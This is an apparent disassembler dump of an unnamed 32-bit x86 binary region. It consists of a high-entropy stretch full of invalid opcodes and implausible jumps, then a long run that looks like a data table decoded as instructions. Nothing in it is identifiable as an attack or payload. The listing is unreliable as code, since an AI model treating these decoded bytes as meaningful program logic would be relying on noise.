  4147f8:	cmp    eax,0xe63eaa13
  4147fd:	fild   DWORD PTR [edx+0xc]
  414800:	lahf   
  414801:	inc    esp
  414802:	or     BYTE PTR [ebp-0x7aa49da2],ch
  414808:	add    DWORD PTR [edi+0xbd9d4c3],esp
  41480e:	dec    esp
  41480f:	test   al,0x8f
  414811:	cwde   
  414812:	pop    edx
  414813:	ds cli 
  414815:	cmp    al,0x64
  414817:	aad    0x66
  414819:	aas    
  41481a:	jmp    FWORD PTR [edx-0x7a76a05e]
  414820:	cmc    
  414821:	xchg   ebx,eax
  414822:	repz sti 
  414824:	jb     0x41489d
  414826:	inc    esi
  414827:	add    al,0x9a
  414829:	ss pop ecx
  41482b:	test   BYTE PTR [ecx-0x19],al
  41482e:	rcl    BYTE PTR [edi],cl
  414830:	loopne 0x41483c
  414832:	add    eax,0xe7edc5f3
  414837:	sbb    cl,BYTE PTR [ebx+0x2b665a96]
  41483d:	jns    0x414881
  41483f:	aaa    
  414840:	xor    cl,BYTE PTR [edi+ebx*4-0x1020077b]
  414847:	fdivr  QWORD PTR [esi]
  414849:	and    DWORD PTR [edi],0x940ee8cb
  41484f:	and    DWORD PTR [ebp+0x3f657856],ebp
  414855:	jnp    0x414850
  414857:	cmc    
  414858:	jle    0x4148b5
  41485a:	xchg   DWORD PTR [esi-0x57df78b7],eax
  414860:	mov    eax,DWORD PTR [edx]
  414862:	add    DWORD PTR [edx-0x1ebea961],eax
  414868:	and    dh,ah
  41486a:	push   es
  41486b:	in     eax,dx
  41486c:	ja     0x41480b
  41486e:	mov    ch,0x2f
  414870:	call   0x13b83b1e
  414875:	jno    0x4148d1
  414877:	xor    al,0x15
  414879:	mov    edx,0xa3fa93a5
  41487e:	(bad)  
  41487f:	mov    eax,ds:0x84df7eba
  414884:	pop    ecx
  414885:	dec    ebx
  414886:	call   0x312841ee
  41488b:	xor    eax,0x7e840aac
  414890:	(bad)  
  414891:	scas   al,BYTE PTR es:[edi]
  414892:	xchg   edx,eax
  414893:	sub    BYTE PTR [ebx],0xa2
  414896:	pop    edi
  414897:	dec    esp
  414898:	add    dh,ah
  41489a:	(bad)
  41489e:	int    0x81
  4148a0:	push   ebp
  4148a1:	mov    dh,0xf6
  4148a3:	les    esp,FWORD PTR [ecx+esi*4-0x3d4947db]
  4148aa:	rol    DWORD PTR ds:0x14215099,1
  4148b0:	xchg   edx,eax
  4148b1:	sbb    DWORD PTR [ebx-0x8],ebx
  4148b4:	xchg   esi,eax
  4148b5:	sbb    eax,0xc66016be
  4148ba:	les    ecx,FWORD PTR [edx+0x4e15e65e]
  4148c0:	sbb    eax,0x94d8d23
  4148c5:	retf   0x65a
  4148c8:	sar    DWORD PTR [edx+0x6f],0xf0
  4148cc:	loop   0x4148e4
  4148ce:	dec    esp
  4148cf:	add    DWORD PTR [edx+ebp*8],0xa699ecde
  4148d6:	fisub  DWORD PTR [ecx-0x39aa435f]
  4148dc:	ficom  WORD PTR [ecx-0x16d6b411]
  4148e2:	mov    al,0x8b
  4148e4:	ficomp WORD PTR [ebx]
  4148e6:	gs cmp eax,0xc561c7c5
  4148ec:	ds and eax,0xe44fb88f
  4148f2:	nop
  4148f3:	inc    ecx
  4148f4:	inc    eax
  4148f5:	fisubr DWORD PTR [esi+0x6be650aa]
  4148fb:	adc    dl,cl
  4148fd:	lock sti 
  4148ff:	sub    al,BYTE PTR [edx]
  414901:	pop    ebp
  414902:	pop    eax
  414903:	in     eax,dx
  414904:	aas    
  414905:	(bad)  
  414906:	(bad)  
  414907:	or     eax,0xa1b48aaf
  41490c:	sbb    BYTE PTR [ebp+esi*2+0x14feb583],bl
  414913:	sbb    al,0x75
  414915:	fdivr  QWORD PTR [edx]
  414917:	sub    eax,0x765b5fa4
  41491c:	mov    al,0x89
  41491e:	inc    ebp
  41491f:	xor    BYTE PTR [eax+ebp*4-0x32b97a43],dl
  414926:	stc    
  414927:	pop    ecx
  414928:	and    edi,DWORD PTR [ecx-0x26]
  41492b:	adc    al,0x5c
  41492d:	out    0xcc,eax
  41492f:	push   ebx
  414930:	addr16 out dx,eax
  414932:	loop   0x4148cc
  414934:	call   0x9c38:0x3f969264
  41493b:	jmp    FWORD PTR [ecx]
  41493d:	mov    esi,0x930a1a5f
  414942:	sub    ecx,DWORD PTR [esi]
  414944:	fstp   QWORD PTR [edi]
  414946:	dec    ecx
  414947:	sub    BYTE PTR [edi-0x5e0c54ff],0x73
  41494e:	jge    0x4149c5
  414950:	cwde   
  414951:	jmp    0x10daceaa
  414956:	stc    
  414957:	cwde   
  414958:	and    DWORD PTR [ebx-0x6b],eax
  41495b:	push   ebp
  41495c:	je     0x414905
  41495e:	mov    dl,0x17
  414960:	inc    ecx
  414961:	ins    DWORD PTR es:[edi],dx
  414962:	lods   al,BYTE PTR ds:[esi]
  414963:	mov    ?,esp
  414965:	jecxz  0x414915
  414967:	test   DWORD PTR [edi-0x265e10e8],edi
  41496d:	inc    ecx
  41496e:	shr    DWORD PTR [edi-0x23],cl
  414971:	in     eax,dx
  414972:	mov    ah,0xd0
  414974:	adc    esi,ebx
  414976:	pop    ebx
  414977:	xchg   edx,eax
  414978:	outs   dx,BYTE PTR ds:[esi]
  414979:	cmp    DWORD PTR [edx-0x55],eax
  41497c:	push   0xff98d4ee
  414981:	sahf   
  414982:	jge    0x41497c
  414984:	loopne 0x414910
  414986:	popf   
  414987:	jl     0x414a07
  414989:	dec    ecx
  41498a:	pop    edx
  41498b:	jo     0x4149ca
  41498d:	arpl   ax,bp
  41498f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414990:	xchg   si,ax
  414992:	xor    DWORD PTR [esi+0x395ce50b],ecx
  414998:	repnz cld 
  41499a:	xor    edi,ebx
  41499c:	test   DWORD PTR [esi+0x20],ebp
  41499f:	add    eax,0x385ba448
  4149a4:	call   0xb82d:0xd0c05839
  4149ab:	test   ch,ch
  4149ad:	xchg   edx,eax
  4149ae:	xor    BYTE PTR [edx-0x1285642e],ch
  4149b4:	(bad)  
  4149b5:	mov    edi,0x8d0be05b
  4149ba:	ins    DWORD PTR es:[edi],dx
  4149bb:	jns    0x414969
  4149bd:	lods   al,BYTE PTR ds:[esi]
  4149be:	out    0xfd,eax
  4149c0:	dec    edx
  4149c1:	adc    edx,DWORD PTR [ebp+0x3]
  4149c4:	inc    edx
  4149c5:	add    al,0x44
  4149c7:	inc    esp
  4149c8:	aas    
  4149c9:	mov    eax,ds:0xddb5243c
  4149ce:	adc    eax,DWORD PTR [edx+0x6208e7f5]
  4149d4:	or     DWORD PTR [ecx],0x68
  4149d7:	xchg   esp,eax
  4149d8:	pop    ebx
  4149d9:	cld    
  4149da:	std    
  4149db:	cmp    DWORD PTR [ebp+0x3d],esi
  4149de:	bound  esp,QWORD PTR [eax+edi*4-0x6919a581]
  4149e5:	push   cs
  4149e6:	icebp  
  4149e7:	push   ebp
  4149e8:	adc    ah,BYTE PTR [esi]
  4149ea:	hlt    
  4149eb:	test   DWORD PTR [esi+0x3c10a771],ecx
  4149f1:	lahf   
  4149f2:	call   0x1d2fcf75
  4149f7:	sub    DWORD PTR [esi+0x34cf79e4],eax
  4149fd:	rcr    ecx,1
  4149ff:	cmc    
  414a00:	(bad)  
  414a02:	jl     0x414a53
  414a04:	sub    DWORD PTR [ebp-0x46c0cc9f],eax
  414a0a:	mov    bh,0x23
  414a0c:	xchg   ecx,eax
  414a0d:	pusha  
  414a0e:	icebp  
  414a0f:	mov    eax,0x7746e628
  414a14:	push   ecx
  414a15:	xor    BYTE PTR [edx],cl
  414a17:	lds    ecx,FWORD PTR [edx+0x1a]
  414a1a:	xchg   edx,eax
  414a1b:	or     eax,0x585862bd
  414a20:	or     al,0x9b
  414a22:	dec    edx
  414a23:	loope  0x414a84
  414a25:	cdq    
  414a26:	aad    0x4e
  414a28:	push   cs
  414a29:	in     al,0xb4
  414a2b:	cs ja  0x414a3d
  414a2e:	ja     0x4149d8
  414a30:	outs   dx,BYTE PTR ds:[esi]
  414a31:	push   ss
  414a32:	mov    ebp,0xbb9fcd20
  414a37:	and    cl,BYTE PTR [ebx]
  414a39:	mov    dl,0x45
  414a3b:	push   cs
  414a3c:	jns    0x414ab5
  414a3e:	cmp    al,0x4d
  414a40:	push   cs
  414a41:	mov    ebp,0x624037da
  414a46:	fadd   DWORD PTR [esi-0x2766ad0a]
  414a4c:	sbb    DWORD PTR [ecx+edx*8+0x1c],eax
  414a50:	mov    ebx,0xadec5be0
  414a55:	popa   
  414a56:	ins    BYTE PTR es:[edi],dx
  414a57:	ret    0x4d76
  414a5a:	outs   dx,BYTE PTR ds:[esi]
  414a5b:	test   DWORD PTR [eax-0x32],eax
  414a5e:	mov    cs,edi
  414a60:	rcr    DWORD PTR [edi],0x97
  414a63:	xchg   BYTE PTR [edx-0x7],al
  414a66:	sub    ah,dh
  414a68:	rol    BYTE PTR [eax+0x4e],cl
  414a6b:	loopne 0x414a95
  414a6d:	and    BYTE PTR [ebx-0xa],bl
  414a70:	or     esp,esi
  414a72:	xor    dl,BYTE PTR [ecx+0x47]
  414a75:	test   eax,0xec9aa190
  414a7a:	adc    eax,0x5acc540f
  414a7f:	jl     0x414aec
  414a81:	and    ah,bh
  414a83:	into   
  414a84:	sbb    BYTE PTR [eax+ebp*8-0x5d],bh
  414a88:	sahf   
  414a89:	push   edi
  414a8a:	ins    DWORD PTR es:[edi],dx
  414a8b:	test   BYTE PTR [edx],dl
  414a8d:	fbld   TBYTE PTR [eax-0x8]
  414a90:	fwait
  414a91:	out    0x2c,eax
  414a93:	and    dh,BYTE PTR [edx-0x79]
  414a96:	jno    0x414aa9
  414a98:	std    
  414a99:	mov    ebx,0xe7fe87b0
  414a9e:	cmp    ch,BYTE PTR [edx-0x24]
  414aa1:	ror    DWORD PTR [esi-0x5e],cl
  414aa4:	aas    
  414aa5:	(bad)  
  414aa6:	pop    esi
  414aa7:	cld    
  414aa8:	imul   eax,DWORD PTR [ebp-0x67d500e5],0x893ee290
  414ab2:	push   es
  414ab3:	inc    ecx
  414ab4:	lahf   
  414ab5:	shr    BYTE PTR [edx],0xd6
  414ab8:	cmp    DWORD PTR [edi-0x1a],edi
  414abb:	test   DWORD PTR [ebx],edx
  414abd:	jae    0x414aad
  414abf:	call   0xc5fd2c93
  414ac4:	(bad)  
  414ac5:	sub    al,0x74
  414ac7:	call   0xbcc3:0xca7aafb1
  414ace:	mov    al,0x24
  414ad0:	aas    
  414ad1:	cmc    
  414ad2:	add    esi,DWORD PTR [eax-0x63086f46]
  414ad8:	sub    DWORD PTR [ebx],ebx
  414ada:	lods   al,BYTE PTR ds:[esi]
  414adb:	inc    ecx
  414adc:	int3   
  414add:	and    BYTE PTR [ebx+0x31b8d68b],dl
  414ae3:	xchg   edi,eax
  414ae4:	mov    ch,0xb0
  414ae6:	fcmovnu st,st(7)
  414ae8:	push   es
  414ae9:	xor    eax,DWORD PTR [ecx+0x11e2386b]
  414aef:	xlat   BYTE PTR ds:[ebx]
  414af0:	and    eax,0xdecc9b17
  414af5:	add    eax,0xf6d68ea6
  414afa:	pushf  
  414afb:	xchg   ah,dl
  414afd:	call   0xb98e6ec2
  414b02:	mov    esp,0x5aea2c25
  414b07:	sub    al,BYTE PTR [esp+eax*8+0x203e750d]
  414b0e:	je     0x414a9b
  414b10:	pop    esp
  414b11:	inc    edi
  414b12:	adc    BYTE PTR [esi-0x78],bh
  414b15:	jb     0x414a98
  414b17:	add    BYTE PTR [edi],dl
  414b19:	dec    ecx
  414b1a:	pop    esi
  414b1b:	xor    al,0x39
  414b1d:	es out dx,al
  414b1f:	fidivr DWORD PTR ds:0x1f3f6eab
  414b25:	call   0xc85cf88e
  414b2a:	add    BYTE PTR [ecx],al
  414b2c:	and    eax,ecx
  414b2e:	test   al,0x6b
  414b30:	dec    ebp
  414b31:	(bad)  
  414b33:	lds    eax,FWORD PTR [ecx]
  414b35:	inc    esi
  414b36:	xchg   esi,eax
  414b37:	mov    ecx,0x846dd470
  414b3c:	mul    BYTE PTR [edx+0x4d35ffed]
  414b42:	loop   0x414b66
  414b44:	call   0x98095ed9
  414b49:	inc    ebp
  414b4a:	fist   DWORD PTR [ebx]
  414b4c:	mov    esi,0x64846263
  414b51:	dec    ebp
  414b52:	mov    cl,0xdc
  414b54:	add    BYTE PTR ds:0x193fc327,ah
  414b5a:	repnz add eax,esp
  414b5d:	and    BYTE PTR [esi-0x3d295b8e],cl
  414b63:	std    
  414b64:	adc    BYTE PTR [esi],dl
  414b66:	mov    cl,0x8b
  414b68:	xchg   esp,eax
  414b69:	(bad)  
  414b6a:	xor    al,0x35
  414b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6d:	(bad)  
  414b6e:	popa   
  414b6f:	jae    0x414be0
  414b71:	push   es
  414b72:	pop    ebx
  414b73:	jo     0x414b6f
  414b75:	ss xchg esp,eax
  414b77:	mov    al,ds:0x14d39470
  414b7c:	mov    ah,al
  414b7e:	push   esp
  414b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b80:	aam    0x80
  414b82:	loope  0x414bc8
  414b84:	ret    0x0
  414b87:	add    BYTE PTR [edx-0x6b],al
  414b8a:	add    al,BYTE PTR [eax]
  414b8c:	lods   al,BYTE PTR ds:[esi]
  414b8d:	xchg   ebx,eax
  414b8e:	add    al,BYTE PTR [eax]
  414b90:	sub    dl,BYTE PTR [edx+eax*1+0x2940000]
  414b97:	add    dh,ah
  414b99:	xchg   esp,eax
  414b9a:	add    al,BYTE PTR [eax]
  414b9c:	ficom  WORD PTR [ebx-0x6b33fffe]
  414ba2:	add    al,BYTE PTR [eax]
  414ba4:	add    BYTE PTR [ebp-0x6ad7fffe],dl
  414baa:	add    al,BYTE PTR [eax]
  414bac:	hlt    
  414bad:	xchg   ebx,eax
  414bae:	add    al,BYTE PTR [eax]
  414bb0:	rcl    BYTE PTR [ebx-0x6a6ffffe],1
  414bb6:	add    al,BYTE PTR [eax]
  414bb8:	jle    0x414b4f
  414bba:	add    al,BYTE PTR [eax]
  414bbc:	mov    ah,0x94
  414bbe:	add    al,BYTE PTR [eax]
  414bc0:	xchg   edx,eax
  414bc1:	xchg   esp,eax
  414bc2:	add    al,BYTE PTR [eax]
  414bc4:	jo     0x414b5a
  414bc6:	add    al,BYTE PTR [eax]
  414bc8:	stos   BYTE PTR es:[edi],al
  414bc9:	xchg   ebp,eax
  414bca:	add    al,BYTE PTR [eax]
  414bcc:	les    edx,FWORD PTR [ebx-0x6a8dfffe]
  414bd2:	add    al,BYTE PTR [eax]
  414bd4:	push   0xffffff95
  414bd6:	add    al,BYTE PTR [eax]
  414bd8:	or     BYTE PTR [edx+eax*1+0x2939000],dl
  414bdf:	add    BYTE PTR [eax],bl
  414be1:	xchg   ebp,eax
  414be2:	add    al,BYTE PTR [eax]
  414be4:	pushf  
  414be5:	xchg   ebp,eax
  414be6:	add    al,BYTE PTR [eax]
  414be8:	pushf  
  414be9:	xchg   esp,eax
  414bea:	add    al,BYTE PTR [eax]
  414bec:	not    BYTE PTR [edx+eax*1+0x2953800]
  414bf3:	add    BYTE PTR [esi-0x77fffd6c],ah
  414bf9:	xchg   esp,eax
  414bfa:	add    al,BYTE PTR [eax]
  414bfc:	bound  edx,QWORD PTR [edx+eax*1+0x2950c00]
  414c03:	add    BYTE PTR [eax-0x6c],bl
  414c06:	add    al,BYTE PTR [eax]
  414c08:	mov    ah,0x95
  414c0a:	add    al,BYTE PTR [eax]
  414c0c:	ret    0x295
  414c0f:	add    BYTE PTR [ebp+edx*4-0x6a79fffe],ah
  414c16:	add    al,BYTE PTR [eax]
  414c18:	ficom  DWORD PTR [edx+eax*1+0x294c000]
  414c1f:	add    BYTE PTR [ebx+edx*4-0x6bcffffe],bl
  414c26:	add    al,BYTE PTR [eax]
  414c28:	cmp    al,0x94
  414c2a:	add    al,BYTE PTR [eax]
  414c2c:	push   ds
  414c2d:	xchg   esp,eax
  414c2e:	add    al,BYTE PTR [eax]
  414c30:	add    BYTE PTR [eax],al
  414c32:	add    BYTE PTR [eax],al
  414c34:	sbb    BYTE PTR [edx-0x69d9fffe],bl
  414c3a:	add    al,BYTE PTR [eax]
  414c3c:	xchg   esi,eax
  414c3d:	xchg   esi,eax
  414c3e:	add    al,BYTE PTR [eax]
  414c40:	ficom  DWORD PTR [ebp-0x6839fffe]
  414c46:	add    al,BYTE PTR [eax]
  414c48:	mov    esi,0xfc00029a
  414c4d:	cdq    
  414c4e:	add    al,BYTE PTR [eax]
  414c50:	jbe    0x414bec
  414c52:	add    al,BYTE PTR [eax]
  414c54:	push   0xffffff97
  414c56:	add    al,BYTE PTR [eax]
  414c58:	cmp    bl,BYTE PTR [ecx-0x65adfffe]
  414c5e:	add    al,BYTE PTR [eax]
  414c60:	cwd    
  414c62:	add    al,BYTE PTR [eax]
  414c64:	push   edx
  414c65:	xchg   edi,eax
  414c66:	add    al,BYTE PTR [eax]
  414c68:	cmp    bl,BYTE PTR [eax-0x6923fffe]
  414c6e:	add    al,BYTE PTR [eax]
  414c70:	pop    eax
  414c71:	cwde   
  414c72:	add    al,BYTE PTR [eax]
  414c74:	push   es
  414c75:	cwde   
  414c76:	add    al,BYTE PTR [eax]
  414c78:	scas   al,BYTE PTR es:[edi]
  414c79:	xchg   edi,eax
  414c7a:	add    al,BYTE PTR [eax]
  414c7c:	mov    ds:0xb8000298,al
  414c81:	xchg   esi,eax
  414c82:	add    al,BYTE PTR [eax]
  414c84:	stos   BYTE PTR es:[edi],al
  414c85:	cdq    
  414c86:	add    al,BYTE PTR [eax]
  414c88:	ss xchg edi,eax
  414c8a:	add    al,BYTE PTR [eax]
  414c8c:	ficom  DWORD PTR [edi-0x69c5fffe]
  414c92:	add    al,BYTE PTR [eax]
  414c94:	xchg   edx,eax
  414c95:	cdq    
  414c96:	add    al,BYTE PTR [eax]
  414c98:	push   edx
  414c99:	xchg   esi,eax
  414c9a:	add    al,BYTE PTR [eax]
  414c9c:	(bad)  
  414c9d:	xchg   ebp,eax
  414c9e:	add    al,BYTE PTR [eax]
  414ca0:	xor    BYTE PTR [edx-0x6741fffe],bl
  414ca6:	add    al,BYTE PTR [eax]
  414ca8:	aam    0x98
  414caa:	add    al,BYTE PTR [eax]
  414cac:	xchg   esi,eax
  414cad:	call   0x2:0x98220002
  414cb4:	push   esp
  414cb5:	cdq    
  414cb6:	add    al,BYTE PTR [eax]
  414cb8:	loopne 0x414c53
  414cba:	add    al,BYTE PTR [eax]
  414cbc:	into   
  414cbd:	cdq    
  414cbe:	add    al,BYTE PTR [eax]
  414cc0:	jl     0x414c5b
  414cc2:	add    al,BYTE PTR [eax]
  414cc4:	adc    al,0x99
  414cc6:	add    al,BYTE PTR [eax]
  414cc8:	je     0x414c60
  414cca:	add    al,BYTE PTR [eax]
  414ccc:	xchg   BYTE PTR [edi-0x678ffffe],dl
  414cd2:	add    al,BYTE PTR [eax]
  414cd4:	cli    
  414cd5:	cwde   
  414cd6:	add    al,BYTE PTR [eax]
  414cd8:	xchg   esp,eax
  414cd9:	cwde   
  414cda:	add    al,BYTE PTR [eax]
  414cdc:	lock xchg edi,eax
  414cde:	add    al,BYTE PTR [eax]
  414ce0:	sbb    dl,BYTE PTR [edi-0x6901fffe]
  414ce6:	add    al,BYTE PTR [eax]
  414ce8:	add    BYTE PTR [eax],al
  414cea:	add    BYTE PTR [eax],al
  414cec:	ficomp DWORD PTR [edx+eax*1+0x29bb600]
  414cf3:	add    BYTE PTR [eax+0x200029c],bh
  414cf9:	popf   
  414cfa:	add    al,BYTE PTR [eax]
  414cfc:	adc    al,0x9c
  414cfe:	add    al,BYTE PTR [eax]
  414d00:	rcr    BYTE PTR [ebx-0x637ffffe],cl
  414d06:	add    al,BYTE PTR [eax]
  414d08:	lock call 0x2:0x9bac0002
  414d10:	xor    al,0x9b
  414d12:	add    al,BYTE PTR [eax]
  414d14:	pusha  
  414d15:	fwait
  414d16:	add    al,BYTE PTR [eax]
  414d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d19:	pushf  
  414d1a:	add    al,BYTE PTR [eax]
  414d1c:	(bad)  
  414d1d:	fwait
  414d1e:	add    al,BYTE PTR [eax]
  414d20:	adc    BYTE PTR [ebx-0x6309fffe],bl
  414d26:	add    al,BYTE PTR [eax]
  414d28:	ins    BYTE PTR es:[edi],dx
  414d29:	pushf  
  414d2a:	add    al,BYTE PTR [eax]
  414d2c:	pusha  
  414d2d:	pushf  
  414d2e:	add    al,BYTE PTR [eax]
  414d30:	lods   al,BYTE PTR ds:[esi]
  414d31:	pushf  
  414d32:	add    al,BYTE PTR [eax]
  414d34:	in     al,0x9c
  414d36:	add    al,BYTE PTR [eax]
  414d38:	ret    0x29c
  414d3b:	add    BYTE PTR [edx-0x65],ch
  414d3e:	add    al,BYTE PTR [eax]
  414d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d41:	fwait
  414d42:	add    al,BYTE PTR [eax]
  414d44:	sbb    BYTE PTR [ebx-0x63c9fffe],0x2
  414d4b:	add    dh,cl
  414d4d:	pushf  
  414d4e:	add    al,BYTE PTR [eax]
  414d50:	mov    ds,WORD PTR [ebx-0x62f3fffe]
  414d56:	add    al,BYTE PTR [eax]
  414d58:	push   esp
  414d59:	pushf  
  414d5a:	add    al,BYTE PTR [eax]
  414d5c:	push   esp
  414d5d:	fwait
  414d5e:	add    al,BYTE PTR [eax]
  414d60:	ficomp WORD PTR [ebx+0x2]
  414d66:	add    BYTE PTR [eax],al
  414d68:	jo     0x414d0a
  414d6a:	add    al,BYTE PTR [eax]
  414d6c:	call   0x5841500e
  414d71:	mov    al,ds:0x9f7e0002
  414d76:	add    al,BYTE PTR [eax]
  414d78:	xor    bl,BYTE PTR [edi-0x5ff9fffe]
  414d7e:	add    al,BYTE PTR [eax]
  414d80:	ss sahf 
  414d82:	add    al,BYTE PTR [eax]
  414d84:	inc    edx
  414d85:	sahf   
  414d86:	add    al,BYTE PTR [eax]
  414d88:	enter  0x29f,0x0
  414d8c:	cwde   
  414d8d:	lahf   
  414d8e:	add    al,BYTE PTR [eax]
  414d90:	adc    al,0x9e
  414d92:	add    al,BYTE PTR [eax]
  414d94:	inc    edx
  414d95:	lahf   
  414d96:	add    al,BYTE PTR [eax]
  414d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d99:	sahf   
  414d9a:	add    al,BYTE PTR [eax]
  414d9c:	push   esp
  414d9d:	sahf   
  414d9e:	add    al,BYTE PTR [eax]
  414da0:	repnz lahf 
  414da2:	add    al,BYTE PTR [eax]
  414da4:	mov    al,cs:0x9f020002
  414daa:	add    al,BYTE PTR [eax]
  414dac:	mov    bl,BYTE PTR [esi-0x6205fffe]
  414db2:	add    al,BYTE PTR [eax]
  414db4:	mov    edx,0x7200029d
  414db9:	sahf   
  414dba:	add    al,BYTE PTR [eax]
  414dbc:	cmp    al,0xa0
  414dbe:	add    al,BYTE PTR [eax]
  414dc0:	ficomp DWORD PTR [ebp-0x60ddfffe]
  414dc6:	add    al,BYTE PTR [eax]
  414dc8:	ficomp WORD PTR [esi-0x60adfffe]
  414dce:	add    al,BYTE PTR [eax]
  414dd0:	mov    dh,0x9e
  414dd2:	add    al,BYTE PTR [eax]
  414dd4:	cmp    al,0x9d
  414dd6:	add    al,BYTE PTR [eax]
  414dd8:	fs lahf 
  414dda:	add    al,BYTE PTR [eax]
  414ddc:	mov    ah,0x9f
  414dde:	add    al,BYTE PTR [eax]
  414de0:	es popf 
  414de2:	add    al,BYTE PTR [eax]
  414de4:	js     0x414d83
  414de6:	add    al,BYTE PTR [eax]
  414de8:	in     al,0x9f
  414dea:	add    al,BYTE PTR [eax]
  414dec:	(bad)  
  414ded:	sahf   
  414dee:	add    al,BYTE PTR [eax]
  414df0:	test   al,0x9d
  414df2:	add    al,BYTE PTR [eax]
  414df4:	adc    bl,BYTE PTR [edi-0x629bfffe]
  414dfa:	add    al,BYTE PTR [eax]
  414dfc:	xchg   esp,eax
  414dfd:	popf   
  414dfe:	add    al,BYTE PTR [eax]
  414e00:	hlt    
  414e01:	sahf   
  414e02:	add    al,BYTE PTR [eax]
  414e04:	sbb    ah,BYTE PTR [eax+0x2]
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	push   0xffffffa1
  414e0e:	add    al,BYTE PTR [eax]
  414e10:	xor    ah,BYTE PTR [ecx-0x5f23fffe]
  414e16:	add    al,BYTE PTR [eax]
  414e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e19:	mov    eax,ds:0xa1cc0002
  414e1e:	add    al,BYTE PTR [eax]
  414e20:	fsub   QWORD PTR [ecx-0x5dadfffe]
  414e26:	add    al,BYTE PTR [eax]
  414e28:	scas   al,BYTE PTR es:[edi]
  414e29:	mov    ds:0xa0bc0002,al
  414e2e:	add    al,BYTE PTR [eax]
  414e30:	jl     0x414dd4
  414e32:	add    al,BYTE PTR [eax]
  414e34:	and    BYTE PTR [ecx-0x5ea5fffe],0x2
  414e3b:	add    BYTE PTR [ecx+eiz*4],bl
  414e3e:	add    al,BYTE PTR [eax]
  414e40:	xchg   edx,eax
  414e41:	mov    al,ds:0xa1f80002
  414e46:	add    al,BYTE PTR [eax]
  414e48:	ins    BYTE PTR es:[edi],dx
  414e49:	mov    ds:0xa2260002,al
  414e4e:	add    al,BYTE PTR [eax]
  414e50:	int3   
  414e51:	mov    al,ds:0xa2900002
  414e56:	add    al,BYTE PTR [eax]
  414e58:	mov    al,ds:0xbe0002a2
  414e5d:	mov    ds:0xa0a20002,al
  414e62:	add    al,BYTE PTR [eax]
  414e64:	dec    edx
  414e65:	mov    eax,ds:0xa10c0002
  414e6a:	add    al,BYTE PTR [eax]
  414e6c:	cwde   
  414e6d:	mov    eax,ds:0xa2440002
  414e72:	add    al,BYTE PTR [eax]
  414e74:	mov    al,0xa0
  414e76:	add    al,BYTE PTR [eax]
  414e78:	mov    WORD PTR [ecx-0x5d9dfffe],fs
  414e7e:	add    al,BYTE PTR [eax]
  414e80:	jmp    0x2a2:0xa0002a0
  414e87:	add    al,bh
  414e89:	mov    al,ds:0xa1ec0002
  414e8e:	add    al,BYTE PTR [eax]
  414e90:	push   ss
  414e91:	mov    ds:0xa2360002,al
  414e96:	add    al,BYTE PTR [eax]
  414e98:	mov    ah,0xa1
  414e9a:	add    al,BYTE PTR [eax]
  414e9c:	add    BYTE PTR [eax],al
  414e9e:	add    BYTE PTR [eax],al
  414ea0:	mov    ss:0xa3fc0002,eax
  414ea6:	add    al,BYTE PTR [eax]
  414ea8:	push   0x7e0002a5
  414ead:	mov    ds:0xa5d80002,eax
  414eb2:	add    al,BYTE PTR [eax]
  414eb4:	call   0x9441515d
  414eb9:	mov    ds:0xa3160002,eax
  414ebe:	add    al,BYTE PTR [eax]
  414ec0:	lods   al,BYTE PTR ds:[esi]
  414ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec2:	add    al,BYTE PTR [eax]
  414ec4:	stos   BYTE PTR es:[edi],al
  414ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec6:	add    al,BYTE PTR [eax]
  414ec8:	sub    ah,BYTE PTR [edx+eax*1+0x2a30800]
  414ecf:	add    BYTE PTR [edx-0x5d],ch
  414ed2:	add    al,BYTE PTR [eax]
  414ed4:	and    ah,BYTE PTR [ebx-0x5ab3fffe]
  414eda:	add    al,BYTE PTR [eax]
  414edc:	cld    
  414edd:	mov    ds:0xa4580002,al
  414ee2:	add    al,BYTE PTR [eax]
  414ee4:	mov    al,0xa3
  414ee6:	add    al,BYTE PTR [eax]
  414ee8:	out    dx,al
  414ee9:	mov    ds:0xa5820002,eax
  414eee:	add    al,BYTE PTR [eax]
  414ef0:	mov    WORD PTR [edx+eax*1+0x2a53600],fs
  414ef7:	add    dl,ah
  414ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efa:	add    al,BYTE PTR [eax]
  414efc:	pop    esp
  414efd:	mov    ds:0xa5200002,eax
  414f02:	add    al,BYTE PTR [eax]
  414f04:	int3   
  414f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f06:	add    al,BYTE PTR [eax]
  414f08:	stos   BYTE PTR es:[edi],al
  414f09:	mov    ds:0xa5f40002,eax
  414f0e:	add    al,BYTE PTR [eax]
  414f10:	inc    esi
  414f11:	mov    ds:0xa55c0002,eax
  414f16:	add    al,BYTE PTR [eax]
  414f18:	fsub   QWORD PTR [edx-0x5aeffffe]
  414f1e:	add    al,BYTE PTR [eax]
  414f20:	(bad)  
  414f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f22:	add    al,BYTE PTR [eax]
  414f24:	ret    0x2a3
  414f27:	add    BYTE PTR [edx-0x17fffd5b],bh
  414f2d:	mov    ds:0xa4460002,al
  414f32:	add    al,BYTE PTR [eax]
  414f34:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  414f36:	add    al,BYTE PTR [eax]
  414f38:	ret    0x2a4
  414f3b:	add    al,bh
  414f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f3e:	add    al,BYTE PTR [eax]
  414f40:	adc    BYTE PTR [edx+eax*1+0x2a3da00],ah
  414f47:	add    BYTE PTR [eax+0x7a0002a5],bl
  414f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4e:	add    al,BYTE PTR [eax]
  414f50:	add    BYTE PTR [eax],al
  414f52:	add    BYTE PTR [eax],al
  414f54:	pusha  
  414f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f56:	add    al,BYTE PTR [eax]
  414f58:	dec    eax
